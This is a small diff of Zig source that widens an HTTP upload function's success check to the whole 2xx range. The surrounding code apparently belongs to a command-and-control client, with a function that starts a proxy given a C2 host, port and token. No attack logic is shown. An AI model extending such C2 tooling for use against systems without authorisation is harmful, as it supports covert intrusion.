@@ -52,7 +52,10 @@ pub fn uploadLog(
     const resp = client.postMultipart("/api/log", &headers, boundary, body.items) catch return error.UploadFailed;
     defer resp.deinit();
 
-    if (resp.status != 200) return error.ApiError;
+    // ponytail: accept 2xx range; retry with backoff for 5xx if
+    // delivery guarantees become critical. Current behavior treats
+    // any non-2xx as failure.
+    if (resp.status < 200 or resp.status >= 300) return error.ApiError;
 }
 
 pub fn sendProxyStart(allocator: std.mem.Allocator, c2_host: []const u8, c2_port: u16, token: []const u8, proxy_port: u16) !void {
